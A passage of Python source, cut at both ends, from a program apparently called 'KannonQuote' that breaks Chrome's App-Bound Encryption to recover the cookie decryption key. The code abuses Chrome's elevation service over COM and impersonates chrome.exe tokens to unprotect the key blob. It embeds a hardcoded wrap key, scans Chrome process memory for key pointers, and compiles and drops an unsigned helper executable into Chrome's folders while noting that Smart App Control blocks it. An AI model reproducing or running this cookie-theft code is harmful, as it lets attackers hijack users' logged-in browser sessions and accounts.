            c_void_p,
            c_uint,
            c_uint,
            c_void_p,
            c_uint,
        ]
        ole32.CoSetProxyBlanket.restype = c_long
        oleaut32 = _oleaut32()
        # S_OK / S_FALSE (already initialized) are both fine.
        init_hr = int(ole32.CoInitializeEx(None, 0x2))  # COINIT_APARTMENTTHREADED
        did_init = init_hr in (0, 1)
        DecryptFn = WINFUNCTYPE(c_long, c_void_p, c_void_p, POINTER(c_void_p), POINTER(c_uint))
        ReleaseFn = WINFUNCTYPE(c_uint, c_void_p)
        try:
            for clsid_s, iid_s in _CHROME_ELEVATOR:
                punk = c_void_p()
                clsid = _guid(clsid_s)
                iid = _guid(iid_s)
                hr = int(
                    ole32.CoCreateInstance(
                        byref(clsid),
                        None,
                        0x4,  # CLSCTX_LOCAL_SERVER
                        byref(iid),
                        byref(punk),
                    )
                )
                last_hr = _hr_label(hr)
                if hr < 0 or not punk.value:
                    continue
                try:
                    ole32.CoSetProxyBlanket(
                        punk,
                        0xFFFFFFFF,  # RPC_C_AUTHN_DEFAULT
                        0xFFFFFFFF,  # RPC_C_AUTHZ_DEFAULT
                        None,
                        6,  # RPC_C_AUTHN_LEVEL_PKT_PRIVACY
                        3,  # RPC_C_IMP_LEVEL_IMPERSONATE
                        None,
                        0x40,  # EOAC_DYNAMIC_CLOAKING
                    )
                    vptr = cast(punk, POINTER(c_void_p))
                    vtable = cast(c_void_p(vptr[0]), POINTER(c_void_p))
                    decrypt = DecryptFn(vtable[5])
                    bstr_in = _bstr_from_bytes(oleaut32, blob)
                    if not bstr_in or not bstr_in.value:
                        continue
                    plaintext = c_void_p()
                    last_error = c_uint()
                    try:
                        dhr = int(
                            decrypt(punk, bstr_in, byref(plaintext), byref(last_error))
                        )
                    finally:
                        _bstr_free(oleaut32, bstr_in)
                    last_hr = _hr_label(dhr)
                    if dhr < 0 or not plaintext.value:
                        continue
                    try:
                        raw = _bstr_bytes(oleaut32, plaintext)
                    finally:
                        _bstr_free(oleaut32, plaintext)
                    key = _accept_aes_key(raw)
                    if key:
                        return key, last_hr
                finally:
                    vptr = cast(punk, POINTER(c_void_p))
                    vtable = cast(c_void_p(vptr[0]), POINTER(c_void_p))
                    ReleaseFn(vtable[2])(punk)
        finally:
            if did_init:
                ole32.CoUninitialize()
    except (AttributeError, OSError, ValueError, TypeError, OverflowError):
        return None, last_hr or "OverflowError"
    except Exception as exc:  # noqa: BLE001 — fail closed, never abort discover
        return None, last_hr or type(exc).__name__
    return None, last_hr


def _oserror_label(exc: BaseException) -> str:
    """WinError / errno name. Never a COM HRESULT the helper did not return."""
    if isinstance(exc, OSError):
        win = getattr(exc, "winerror", None)
        if win is not None:
            names = {
                2: "FileNotFound",
                3: "PathNotFound",
                5: "AccessDenied",
                32: "SharingViolation",
            }
            return names.get(int(win), str(int(win)))  # 4551 = Smart App Control
        if exc.errno:
            return f"errno{int(exc.errno)}"
    return type(exc).__name__


def _join_abe_hr(parts: list[str]) -> str:
    out: list[str] = []
    for part in parts:
        text = (part or "").strip()
        if text and text not in out:
            out.append(text)
    return _safe_snapshot_detail(";".join(out))[:80]


def _abe_hr_from_stderr(stderr: bytes | None) -> str:
    if not stderr:
        return ""
    for line in stderr.decode("ascii", "replace").splitlines():
        if line.startswith("abe_hr="):
            return line.split("=", 1)[1].strip()
    return ""


def _v20_verify_samples(primary: bytes | None) -> list[bytes]:
    """Every landed v20 blob. Longest-only rejected a rotated key (apc:ok, v20_ok=0)."""
    out: list[bytes] = []
    seen: set[bytes] = set()

    def add(blob: bytes | None) -> None:
        if not _valid_v20_sample(blob):
            return
        raw = bytes(blob or b"")
        if raw in seen:
            return
        seen.add(raw)
        out.append(raw)

    add(primary)
    cached = _cache.get("_v20_verify")
    if isinstance(cached, list):
        for blob in cached:
            if isinstance(blob, (bytes, bytearray)):
                add(bytes(blob))
    if len(out) < 2:
        for blob in _v20_samples_from_cache():
            add(blob)
    return out


def _aes_key_windows(material: bytes | None) -> list[bytes]:
    """32-byte AES-256 windows from an APC plain. Wrong offset was dropping the key."""
    if not material:
        return []
    out: list[bytes] = []
    seen: set[bytes] = set()

    def add(buf: bytes) -> None:
        if len(buf) == 32 and buf not in seen:
            seen.add(buf)
            out.append(buf)

    add(material)
    if len(material) > 32:
        add(material[:32])
        add(material[-32:])
        for off in (8, 16):
            if off + 32 <= len(material):
                add(material[off : off + 32])
    return out


def _app_bound_blob_bytes() -> bytes:
    """APPB-stripped Local State body. Re-read disk if memscan cache was cleared."""
    blob = _cache.get("_app_bound_blob")
    if isinstance(blob, (bytes, bytearray)) and blob:
        return bytes(blob)
    b64 = _cache.get("_app_bound_b64")
    if isinstance(b64, str) and b64.strip():
        raw = _app_bound_ciphertext(b64)
        if raw:
            _cache["_app_bound_blob"] = raw
            return raw
    return b""


def _plain_aes_keys(plain: bytes | None) -> list[bytes]:
    """Every 32-byte window of an APPB GCM plaintext. Do not use on raw APC cands."""
    if not plain:
        return []
    out: list[bytes] = []
    seen: set[bytes] = set()

    def add(buf: bytes | None) -> None:
        if buf and len(buf) == 32 and buf not in seen:
            seen.add(buf)
            out.append(buf)

    add(_accept_aes_key(plain))
    if len(plain) == 32:
        add(plain)
        return out
    for off in range(0, len(plain) - 31):
        add(plain[off : off + 32])
    add(_accept_aes_key(plain[32:] if len(plain) > 32 else b""))
    return out


def _pop_len_prefixed(blob: bytes) -> tuple[bytes, bytes] | None:
    """elevator.cc AppendStringWithLength: uint32 LE + payload."""
    if len(blob) < 4:
        return None
    n = int.from_bytes(blob[:4], "little")
    if n < 0 or 4 + n > len(blob):
        return None
    return blob[4 : 4 + n], blob[4 + n :]


# elevation_service.exe flag=1 AES-256 wrap. Public; not read from Program Files.
_FLAG1_AES = bytes.fromhex(
    "B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787"
)


def _looks_like_dpapi(blob: bytes) -> bool:
    return len(blob) >= 24 and blob[:4] == b"\x01\x00\x00\x00"


def _gcm_record_views(body: bytes) -> list[bytes]:
    """Nonce/flag views from THIS blob's length. No offset spray."""
    out: list[bytes] = []
    seen: set[bytes] = set()

    def add(part: bytes | None) -> None:
        if not part or len(part) < 12 + 16 + 1:
            return
        raw = bytes(part)
        if raw not in seen:
            seen.add(raw)
            out.append(raw)

    add(body)
    if body.startswith(b"APPB"):
        add(body[4:])
    if body.startswith(b"v20"):
        add(body[3:])
    if body.startswith(b"DPAPI"):
        add(body[5:])
    if body and body[0] in (0, 1, 2, 3):
        add(body[1:])
        if body[0] == 3 and len(body) > 33:
            add(body[33:])
    add(body[4:])
    add(body[8:])
    if len(body) >= 60:
        add(body[:60])
        add(body[-60:])
    if len(body) >= 61:
        add(body[:61])
        add(body[-61:])
        add(body[1:61])
    popped = _pop_len_prefixed(body)
    if popped:
        add(popped[0])
        add(popped[1])
        popped2 = _pop_len_prefixed(popped[1])
        if popped2:
            add(popped2[0])
            add(popped2[1])
    idx = body.lower().find(b"chrome.exe")
    if idx != -1:
        rest = body[idx + 10 :]
        if rest.startswith(b"\x00"):
            rest = rest[1:]
        add(rest)
        if rest:
            add(rest[1:])
    return out


def _app_bound_layout_views(blob: bytes) -> tuple[str, list[bytes]]:
    """Fingerprint this PC's APPB (prefix, length) and the GCM views to try."""
    if blob.startswith(b"APPB"):
        blob = blob[4:]
    n = len(blob)
    kind = f"n{n}"
    if _looks_like_dpapi(blob):
        kind = "dpapi"
    elif blob.startswith(b"v20"):
        kind = "v20"
    elif n == 60:
        kind = "n60"
    elif n == 61 and blob[:1] in (b"\x01", b"\x02", b"\x03"):
        kind = f"flag{blob[0]}"
    views: list[bytes] = []
    seen: set[bytes] = set()

    def add_all(body: bytes) -> None:
        for item in _gcm_record_views(body):
            if item not in seen:
                seen.add(item)
                views.append(item)

    add_all(blob)
    try:
        inner = _dpapi_unprotect(blob)
    except Exception:  # noqa: BLE001 — keep appb:dpapi:N even if LocalFree overflows
        inner = None
    if inner:
        kind = f"{kind}+u"
        add_all(inner)
        if inner.startswith(b"APPB"):
            add_all(inner[4:])
        if inner.startswith(b"DPAPI"):
            add_all(inner[5:])
    return f"appb:{kind}:{n}", views


def _app_bound_gcm_payloads(blob: bytes) -> list[bytes]:
    """Diagnosed GCM views for this APPB body. 12-byte nonce at the record header."""
    _fp, views = _app_bound_layout_views(blob)
    return views


def _aes_gcm_decrypt_layouts(payload: bytes, key: bytes) -> bytes:
    """nonce|ct|tag (cookies) and nonce|tag|ct (elevation flag 1/2)."""
    if not payload or not key or len(payload) < 12 + 16 + 1:
        return b""
    plain = _aes_gcm_decrypt_bytes(payload, key)
    if plain:
        return plain
    if payload[:3] == b"v20":
        plain = _aes_gcm_decrypt_bytes(payload[3:], key)
        if plain:
            return plain
        payload = payload[3:]
        if len(payload) < 12 + 16 + 1:
            return b""
    nonce, tag, ciphertext = payload[:12], payload[12:28], payload[28:]
    if ciphertext:
        return _aes_gcm_decrypt_bytes(nonce + ciphertext + tag, key)
    return b""


def _cookie_keys_from_wrap(wrap: bytes, app_bound: bytes | None) -> list[bytes]:
    """APC 32-byte wrap key → AES-256-GCM unwrap Local State → cookie AES key."""
    keys: list[bytes] = []
    seen: set[bytes] = set()

    def add(key: bytes | None) -> None:
        if key and len(key) == 32 and key not in seen:
            seen.add(key)
            keys.append(key)

    if not wrap or len(wrap) != 32:
        return keys
    blob = app_bound if isinstance(app_bound, (bytes, bytearray)) and app_bound else _app_bound_blob_bytes()
    if not blob:
        return keys
    fp, views = _app_bound_layout_views(bytes(blob))
    _cache["_appb_fp"] = fp
    _cache["_appb_views"] = views
    for payload in views:
        plain = _aes_gcm_decrypt_layouts(payload, wrap)
        if not plain:
            continue
        for window in _plain_aes_keys(plain):
            add(window)
    return keys


def _cookie_key_from_unprotect_plain(
    plain: bytes, v20_sample: bytes | None
) -> bytes | None:
    """Inner payload after CryptUnprotect of appb:dpapi:640 → cookie AES key."""
    if not plain:
        return None
    for cand in _plain_aes_keys(plain) + _aes_key_windows(plain):
        if _v20_key_ok(cand, v20_sample, all_blobs=True):
            return cand
    popped = _pop_len_prefixed(plain)
    if popped:
        _head, rest = popped
        if _v20_key_ok(_head if len(_head) == 32 else None, v20_sample, all_blobs=True):
            return _head[:32]
        popped2 = _pop_len_prefixed(rest)
        if popped2:
            key, _tail = popped2
            if _v20_key_ok(key if len(key) == 32 else None, v20_sample, all_blobs=True):
                return key[:32]
            for cand in _plain_aes_keys(key) + _plain_aes_keys(_tail):
                if _v20_key_ok(cand, v20_sample, all_blobs=True):
                    return cand
        for cand in _plain_aes_keys(rest):
            if _v20_key_ok(cand, v20_sample, all_blobs=True):
                return cand
    old = _cache.get("_app_bound_blob")
    _cache["_app_bound_blob"] = plain
    try:
        for wrap in _static_wrap_keys():
            hit = _abe_key_from_material(wrap, v20_sample)
            if hit:
                return hit
    finally:
        _cache["_app_bound_blob"] = old
    return None


def _impersonate_chrome_unprotect(blob: bytes) -> bytes | None:
    """CryptUnprotectData while impersonating chrome.exe (same logon as the Cookies DB)."""
    if os.name != "nt" or not blob:
        return None
    try:
        import ctypes
        from ctypes import wintypes
    except ImportError:
        return None
    if not hasattr(ctypes, "WinDLL"):
        return None
    adv = ctypes.WinDLL("advapi32", use_last_error=True)
    k32 = ctypes.WinDLL("kernel32", use_last_error=True)
    adv.OpenProcessToken.argtypes = [
        wintypes.HANDLE,
        wintypes.DWORD,
        ctypes.POINTER(wintypes.HANDLE),
    ]
    adv.OpenProcessToken.restype = wintypes.BOOL
    adv.ImpersonateLoggedOnUser.argtypes = [wintypes.HANDLE]
    adv.ImpersonateLoggedOnUser.restype = wintypes.BOOL
    adv.RevertToSelf.argtypes = []
    adv.RevertToSelf.restype = wintypes.BOOL
    k32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
    k32.OpenProcess.restype = wintypes.HANDLE
    k32.CloseHandle.argtypes = [wintypes.HANDLE]
    k32.CloseHandle.restype = wintypes.BOOL
    token_access = 0x0008 | 0x0002 | 0x0004  # QUERY | DUPLICATE | IMPERSONATE
    for pid in _chrome_pids_prioritized()[:4]:
        proc = k32.OpenProcess(0x0400, False, pid)
        if not proc:
            continue
        tok = wintypes.HANDLE()
        got_tok = False
        try:
            if not adv.OpenProcessToken(proc, token_access, ctypes.byref(tok)):
                continue
            got_tok = True
            if not adv.ImpersonateLoggedOnUser(tok):
                continue
            try:
                plain = _dpapi_unprotect_local(blob)
                if plain:
                    return plain
            finally:
                adv.RevertToSelf()
        except (AttributeError, OSError, ValueError, TypeError):
            continue
        finally:
            if got_tok:
                k32.CloseHandle(tok)
            k32.CloseHandle(proc)
    return None


def _dpapi_unprotect_appb(blob: bytes) -> bytes | None:
    """CryptUnprotect the 640-byte Local State APPB body. No CoCreate."""
    if not blob:
        return None
    try:
        current = blob
        last: bytes | None = None
        for _ in range(4):
            plain = (
                _dpapi_unprotect_local(current)
                or _impersonate_chrome_unprotect(current)
                or _chrome_unprotect_data(current)
            )
            if not plain:
                if last is None:
                    return _chrome_unprotect_memory_blob(current)
                return last
            last = plain
            nxt = plain[4:] if plain.startswith(b"APPB") else plain
            if _looks_like_dpapi(nxt) and nxt != current:
                current = nxt
                continue
            return plain
        return last
    except Exception:  # noqa: BLE001 — Linux tests patch os.name; quoting PC must not abort
        return None


def _static_wrap_keys() -> list[bytes]:
    """v10 DPAPI key + elevation flag=1 wrap. Tried once against diagnosed APPB."""
    out: list[bytes] = []
    v10 = _cache.get("_v10_key")
    if isinstance(v10, (bytes, bytearray)) and len(v10) == 32:
        out.append(bytes(v10))
    out.append(_FLAG1_AES)
    return out


def _static_app_bound_cookie_key(v20_sample: bytes | None) -> bytes | None:
    """Unwrap Local State from blob layout + known wrap keys. No memscan."""
    blob = _app_bound_blob_bytes()
    if blob:
        fp, views = _app_bound_layout_views(blob)
        _cache["_appb_fp"] = fp
        _cache["_appb_views"] = views
        inner = _dpapi_unprotect_appb(blob)
        if inner:
            hit = _cookie_key_from_unprotect_plain(inner, v20_sample)
            if hit:
                return hit
        for view in views:
            if len(view) == 32 and _high_entropy32(view) and _v20_key_ok(
                view, v20_sample, all_blobs=True
            ):
                return view
    for wrap in _static_wrap_keys():
        hit = _abe_key_from_material(wrap, v20_sample)
        if hit:
            return hit
    return None


def _abe_proves_cookies(key: bytes | None, v20_sample: bytes | None) -> bool:
    """True only when a 32-byte key yields cookie text from a landed v20 blob."""
    return bool(key) and len(key) == 32 and _v20_key_ok(key, v20_sample, all_blobs=True)


def _abe_key_from_material(
    material: bytes | None, v20_sample: bytes | None
) -> bytes | None:
    """Direct cookie key, or Chrome 151 wrap: APC key GCM-unwraps the APPB blob."""
    if not material:
        return None
    app_bound = _app_bound_blob_bytes() or None
    for cand in _aes_key_windows(material):
        if _v20_key_ok(cand, v20_sample, all_blobs=True):
            return cand
        for derived in _cookie_keys_from_wrap(cand, app_bound):
            if _v20_key_ok(derived, v20_sample, all_blobs=True):
                return derived
            # One more wrap level: inner 32 may be another GCM wrap key.
            for nested in _cookie_keys_from_wrap(derived, app_bound):
                if _v20_key_ok(nested, v20_sample, all_blobs=True):
                    return nested
    return None


def _v20_key_ok(
    key: bytes | None, v20_sample: bytes | None, *, all_blobs: bool = True
) -> bool:
    if not key:
        return False
    samples = _v20_verify_samples(v20_sample)
    if not samples:
        return False
    if not all_blobs and len(samples) > 3:
        samples = [samples[0], samples[len(samples) // 2], samples[-1]]
    for cand in _aes_key_windows(key):
        for sample in samples:
            if _aes_gcm_decrypt_bytes(sample[3:], cand):
                return True
    return False


def _key_from_helper_candidates(stdout: bytes, v20_sample: bytes) -> bytes | None:
    """Parse cand=<hex> lines. Never log the hex or the cookie."""
    if not stdout or not v20_sample or v20_sample[:3] != b"v20":
        return None
    text = stdout.decode("ascii", "replace")
    seen: set[str] = set()
    for line in text.splitlines():
        line = line.strip()
        if not line.startswith("cand="):
            continue
        hexpart = line[5:].strip()
        if hexpart in seen or len(hexpart) not in {32, 64}:
            continue
        seen.add(hexpart)
        try:
            cand = bytes.fromhex(hexpart)
        except ValueError:
            continue
        if _v20_key_ok(cand, v20_sample):
            return cand
        hit = _abe_key_from_material(cand, v20_sample)
        if hit:
            return hit
    return None


def _elevator_decrypt_via_chrome_dir(v20_sample: bytes) -> tuple[bytes | None, str]:
    """Compile/copy/run kannon_quote_abe.exe in user-writable Chrome-like dirs."""
    trail: list[str] = []
    if os.name != "nt":
        trail.append("chrome_dir:not_nt")
    if not _valid_v20_sample(v20_sample):
        trail.append("no_v20_sample")
        if os.name != "nt":
            return None, _join_abe_hr(trail)
        v20_sample = _resolve_v20_sample(v20_sample) or b""
        if not _valid_v20_sample(v20_sample):
            return None, _join_abe_hr(trail)
    # Diagnose APPB and try layout-derived wrap keys before memscan.
    key = _static_app_bound_cookie_key(v20_sample)
    if _abe_proves_cookies(key, v20_sample):
        return key, "0x00000000"
    # In-process memscan first. Unsigned helper is blocked by Smart App Control (4551).
    key, hr = _memscan_abe_key(v20_sample)
    if _abe_proves_cookies(key, v20_sample):
        return key, "0x00000000"
    if hr:
        trail.append(hr)
    helper, compile_hr = _compiled_abe_helper_exe()
    if helper is None:
        trail.append(compile_hr or "csc_missing")
    else:
        dests, copy_hr = _install_abe_helper(helper)
        if copy_hr:
            trail.append(copy_hr)
        ran = False
        for dest in dests or [helper]:
            ran = True
            key, hr = _run_abe_helper(dest, v20_sample)
            if _abe_proves_cookies(key, v20_sample):
                return key, "0x00000000"
            if hr:
                trail.append(hr)
            if hr and "4551" in hr:
                break
        if not ran:
            trail.append("helper:never_ran")
    return None, _join_abe_hr(trail) or "helper:never_ran"


def _is_program_files_dir(path: Path) -> bool:
    text = str(path).replace("/", "\\").casefold()
    for env in ("PROGRAMFILES", "PROGRAMFILES(X86)"):
        root = (os.environ.get(env) or "").replace("/", "\\").casefold().rstrip("\\")
        if root and (text == root or text.startswith(root + "\\")):
            return True
    return "\\program files\\" in f"\\{text}\\"


def _user_abe_helper_dirs() -> list[Path]:
    """User-writable Chrome-like dirs. Never Program Files (EACCES / errno 13)."""
    found: list[Path] = []
    seen: set[str] = set()

    def add(path: Path) -> None:
        try:
            path = path.resolve()
        except OSError:
            path = path
        if _is_program_files_dir(path):
            return
        key = str(path).replace("/", "\\").casefold()
        if key in seen:
            return
        seen.add(key)
        found.append(path)

    versions: list[str] = []
    for chrome_dir in _chrome_helper_dirs():
        if chrome_dir.name[:1].isdigit() and "." in chrome_dir.name:
            versions.append(chrome_dir.name)
        if not _is_program_files_dir(chrome_dir):
            add(chrome_dir)
    local = os.environ.get("LOCALAPPDATA") or ""
    if local:
        app = Path(local) / "Google" / "Chrome" / "Application"
        for ver in versions:
            add(app / ver)
        add(Path(local) / "KannonQuote" / "abe")
    return found


def _install_abe_helper(helper: Path) -> tuple[list[Path], str]:
    dests: list[Path] = []
    errors: list[str] = []
    dirs = _user_abe_helper_dirs()
    if not dirs:
        return [], "chrome_dir:empty"
    for app_dir in dirs:
        dest = app_dir / _ABE_HELPER_NAME
        try:
            app_dir.mkdir(parents=True, exist_ok=True)
            shutil.copy2(helper, dest)
        except OSError as exc:
            errors.append(f"copy:{_oserror_label(exc)}")
            continue
        dests.append(dest)
    if dests:
        return dests, ""
    return [], errors[0] if errors else "copy:failed"


def _write_appb_helper_blob() -> Path | None:
    """User-writable APPB body for the chrome_dir helper. Never Program Files."""
    blob = _app_bound_blob_bytes()
    if not blob:
        return None
    local = os.environ.get("LOCALAPPDATA") or ""
    if not local:
        return None
    root = Path(local) / "KannonQuote" / "abe"
    try:
        root.mkdir(parents=True, exist_ok=True)
        path = root / "appb.bin"
        path.write_bytes(blob)
        return path
    except OSError:
        return None


def _run_abe_helper(exe: Path, v20_sample: bytes) -> tuple[bytes | None, str]:
    env = os.environ.copy()
    pids = _chrome_pids_prioritized()
    if pids:
        env["KANNON_CHROME_PIDS"] = ",".join(str(p) for p in pids)
    appb_path = _write_appb_helper_blob()
    if appb_path:
        env["KANNON_APPB_PATH"] = str(appb_path)
    try:
        run = subprocess.run(
            [str(exe)],
            input=v20_sample,
            capture_output=True,
            timeout=_ABE_HELPER_TIMEOUT_S,
            check=False,
            env=env,
        )
    except subprocess.TimeoutExpired:
        return None, "helper:timeout"
    except OSError as exc:
        return None, f"run:{_oserror_label(exc)}"
    except subprocess.SubprocessError as exc:
        return None, f"run:{type(exc).__name__}"
    err = _abe_hr_from_stderr(run.stderr)
    if run.returncode == 0:
        key = _accept_aes_key(run.stdout)
        if _v20_key_ok(key, v20_sample):
            return key, err or "0x00000000"
        if key:
            return None, err or "helper:bad_key"
    key = _key_from_helper_candidates(run.stdout or b"", v20_sample)
    if key:
        return key, "0x00000000"
    return None, err or f"helper:exit{run.returncode}"


def _compiled_abe_helper_exe() -> tuple[Path | None, str]:
    global _compiled_abe_helper
    if _compiled_abe_helper is not None and _compiled_abe_helper.is_file():
        return _compiled_abe_helper, ""
    csc = _find_csc()
    if csc is None:
        return None, "csc_missing"
    tmp = Path(tempfile.mkdtemp(prefix="kannon-abe-"))
    cs_path = tmp / "abe.cs"
    exe_path = tmp / _ABE_HELPER_NAME
    try:
        cs_path.write_text(_ABE_HELPER_CS, encoding="utf-8")
        run = subprocess.run(
            [str(csc), "/nologo", "/target:exe", "/platform:x64", f"/out:{exe_path}", str(cs_path)],
            capture_output=True,
            timeout=60,
            check=False,
        )
        if run.returncode != 0 or not exe_path.is_file():
            return None, f"csc:exit{run.returncode}"
        _compiled_abe_helper = exe_path
        return exe_path, ""
    except OSError as exc:
        return None, f"csc:{_oserror_label(exc)}"
    except subprocess.SubprocessError as exc:
        return None, f"csc:{type(exc).__name__}"


def _chrome_pids() -> list[int]:
    pids: list[int] = []
    try:
        run = subprocess.run(
            ["tasklist", "/FI", "IMAGENAME eq chrome.exe", "/FO", "CSV", "/NH"],
            capture_output=True,
            text=True,
            timeout=5,
            check=False,
        )
    except (OSError, subprocess.SubprocessError):
        return pids
    for line in (run.stdout or "").splitlines():
        parts = [p.strip().strip('"') for p in line.split(",")]
        if len(parts) >= 2 and parts[1].isdigit():
            pids.append(int(parts[1]))
    return pids


def _chrome_pid_score(command_line: str) -> int:
    cmd = (command_line or "").lower()
    if "network.mojom.networkservice" in cmd or "service-sandbox-type=network" in cmd:
        return 0
    if "--type=" not in cmd:
        return 1
    if "--type=utility" in cmd:
        return 2
    if "--type=renderer" in cmd or "--type=gpu" in cmd or "crashpad" in cmd:
        return 9
    return 5


def _chrome_abe_cmd_ok(command_line: str) -> bool:
    """Include unless the command line is a known renderer/gpu/crashpad."""
    return _chrome_pid_score(command_line) < 9


def _chrome_pids_prioritized() -> list[int]:
    """Prefer browser/network; if that filter is empty, use every chrome.exe."""
    all_pids = _chrome_pids()
    scored: list[tuple[int, int]] = []
    try:
        ps = _windows_powershell()
        script = (
            "Get-CimInstance Win32_Process -Filter \"Name='chrome.exe'\" | "
            "ForEach-Object { '{0}`t{1}' -f $_.ProcessId, $_.CommandLine }"
        )
        run = subprocess.run(
            [ps, "-NoProfile", "-NonInteractive", "-Command", script],
            capture_output=True,
            text=True,
            timeout=8,
            check=False,
        )
        for line in (run.stdout or "").splitlines():
            pid_s, _, cmd = line.partition("\t")
            pid_s = pid_s.strip()
            if pid_s.isdigit():
                scored.append((_chrome_pid_score(cmd), int(pid_s)))
    except (OSError, subprocess.SubprocessError):
        scored = []
    preferred = [pid for score, pid in sorted(scored) if score <= 1]
    rest = [
        pid
        for score, pid in sorted(scored)
        if 1 < score < 9 and pid not in preferred
    ]
    if preferred:
        return preferred + rest
    if rest:
        return rest
    return all_pids


def _canonical_ptr(addr: int) -> int:
    return int(addr) & _ABE_PTR_MASK


def _looks_like_user_ptr(addr: int) -> bool:
    return 0x10000 <= _canonical_ptr(addr) < 0x00007FFFFFFEFFFF


def _high_entropy32(buf: bytes) -> bool:
    return len(buf) == 32 and len(set(buf)) >= 12


# Encryptor::KeyRing is map<string, optional<Key>>. string is 24-byte SSO.
# Key = optional<Algorithm> + vector key_ + bool. key_.begin is at +32 or +40.
_KEYRING_V20_MARK = b"\x03\x00\x00\x00\x00\x01"
_KEYRING_VEC_OFFS = (32, 40, 48)


def _vector32_at(buf: bytes, base: int, off: int = 32) -> int | None:
    """key_.begin if [base+off] is a 32-byte libc++ vector (begin/end)."""
    if base < 0 or base + off + 16 > len(buf):
        return None
    begin = int.from_bytes(buf[base + off : base + off + 8], "little")
    finish = int.from_bytes(buf[base + off + 8 : base + off + 16], "little")
    if _looks_like_user_ptr(begin) and finish == begin + 32:
        return _canonical_ptr(begin)
    if (
        off == 32
        and base + 29 <= len(buf)
        and buf[base + 23 : base + 29] == _KEYRING_V20_MARK
        and _looks_like_user_ptr(begin)
    ):
        return _canonical_ptr(begin)
    return None


def _keyring_v20_key_ptrs(buf: bytes) -> list[int]:
    """key_.begin from a Chrome 151 KeyRing `v20` node (SSO + optional<Key>)."""
    out: list[int] = []
    start = 0
    while True:
        idx = buf.find(b"v20\x00", start)
        if idx < 0:
            break
        start = idx + 1
        bases = [idx]
        if idx >= 1:
            bases.append(idx - 1)
        aligned = idx & ~7
        if aligned not in bases:
            bases.append(aligned)
        for base in bases:
            for off in _KEYRING_VEC_OFFS:
                ptr = _vector32_at(buf, base, off)
                if ptr is not None:
                    out.append(ptr)
    return out


def _extract_abe_candidate_ptrs(buf: bytes) -> list[tuple[int, int]]:
    """Chrome 151 KeyRing v20 node (+32 → key_) then libc++ size-32 vector."""
    found: dict[int, int] = {}
    for ptr in _keyring_v20_key_ptrs(buf):
        found[ptr] = 32
    n = len(buf)
    if n < 24:
        return list(found.items())
    for i in range(0, n - 23, 8):
        start = int.from_bytes(buf[i : i + 8], "little")
        finish = int.from_bytes(buf[i + 8 : i + 16], "little")
        cap = int.from_bytes(buf[i + 16 : i + 24], "little")
        if not _looks_like_user_ptr(start):
            continue
        raw_start = _canonical_ptr(start)
        if (
            _looks_like_user_ptr(finish)
            and _looks_like_user_ptr(cap)
            and finish == start + 32
            and cap >= finish
            and (cap - start) <= 0x10000
        ):
            found[raw_start] = 32
    return list(found.items())


def _inline_bstr_keys(buf: bytes) -> list[bytes]:
    """DWORD/size_t length 32 + high-entropy key, including bytes after size_t 32."""
    out: list[bytes] = []
    prefix4 = b"\x20\x00\x00\x00"
    prefix8 = b"\x20\x00\x00\x00\x00\x00\x00\x00"
    start = 0
    while True:
        idx = buf.find(prefix8, start)
        if idx < 0 or idx + 40 > len(buf):
            break
        cand = buf[idx + 8 : idx + 40]
        start = idx + 1
        if _high_entropy32(cand):
            out.append(cand)
    start = 0
    while True:
        idx = buf.find(prefix4, start)
        if idx < 0 or idx + 36 > len(buf):
            break
        start = idx + 1
        if idx + 8 <= len(buf) and buf[idx + 4 : idx + 8] == b"\x00\x00\x00\x00":
            continue
        cand = buf[idx + 4 : idx + 36]
        if _high_entropy32(cand):
            out.append(cand)
    return out


def _keys_from_key_blob(blob: bytes) -> list[bytes]:
    """First/last 32 and elevator [len][data][len=32][key]."""
    out: list[bytes] = []
    if len(blob) >= 32:
        if _high_entropy32(blob[:32]):
            out.append(blob[:32])
        if _high_entropy32(blob[-32:]):
            out.append(blob[-32:])
    if len(blob) >= 8:
        n = int.from_bytes(blob[:4], "little")
        if 0 < n < 4096 and 4 + n + 4 + 32 <= len(blob):
            n2 = int.from_bytes(blob[4 + n : 8 + n], "little")
            if n2 == 32:
                cand = blob[8 + n : 40 + n]
                if _high_entropy32(cand):
                    out.append(cand)
    return out


def _aligned_entropy_keys(buf: bytes) -> list[bytes]:
    """Unused by memscan — Chrome 151 key_ is CryptProtectMemory, not raw entropy."""
    del buf
    return []


def _local_export_addr(dll: str, name: str) -> tuple[int, int]:
    """(func, module_base) in this process."""
    import ctypes

    mod = ctypes.WinDLL(dll, use_last_error=True)
    base = int(mod._handle)
    fn = int(ctypes.cast(getattr(mod, name), ctypes.c_void_p).value or 0)
    return fn, base


def _remote_export_addr(k32: Any, handle: Any, dll: str, name: str) -> int:
    """Export in the chrome PID (local RVA + remote module base)."""
    import ctypes
    from ctypes import wintypes

    try:
        local_fn, local_base = _local_export_addr(dll, name)
    except (AttributeError, OSError, TypeError):
        return 0
    if not local_fn or not local_base:
        return 0
    rva = local_fn - local_base
    want = dll.lower()
    enum = getattr(k32, "K32EnumProcessModules", None)
    namefn = getattr(k32, "K32GetModuleBaseNameW", None)
    if enum is None or namefn is None:
        return local_fn
    mods = (wintypes.HMODULE * 1024)()
    needed = wintypes.DWORD(0)
    enum.argtypes = [
        wintypes.HANDLE,
        ctypes.POINTER(wintypes.HMODULE),
        wintypes.DWORD,
        ctypes.POINTER(wintypes.DWORD),
    ]
    enum.restype = wintypes.BOOL
    if not enum(handle, mods, ctypes.sizeof(mods), ctypes.byref(needed)):
        return local_fn
    count = min(int(needed.value) // ctypes.sizeof(wintypes.HMODULE), 1024)
    namefn.argtypes = [
        wintypes.HANDLE,
        wintypes.HMODULE,
        wintypes.LPWSTR,
        wintypes.DWORD,
    ]
    namefn.restype = wintypes.DWORD
    buf = ctypes.create_unicode_buffer(260)
    for i in range(count):
        buf.value = ""
        if namefn(handle, mods[i], buf, 260) and buf.value.lower() == want:
            return int(mods[i]) + rva
    return local_fn


def _threads_for_pid(pid: int) -> list[int]:
    if os.name != "nt":
        return []
    try:
        import ctypes
        from ctypes import wintypes
    except ImportError:
        return []

    class THREADENTRY32(ctypes.Structure):
        _fields_ = [
            ("dwSize", wintypes.DWORD),
            ("cntUsage", wintypes.DWORD),
            ("th32ThreadID", wintypes.DWORD),
            ("th32OwnerProcessID", wintypes.DWORD),
            ("tpBasePri", ctypes.c_long),
            ("tpDeltaPri", ctypes.c_long),
            ("dwFlags", wintypes.DWORD),
        ]

    k32 = ctypes.WinDLL("kernel32", use_last_error=True)
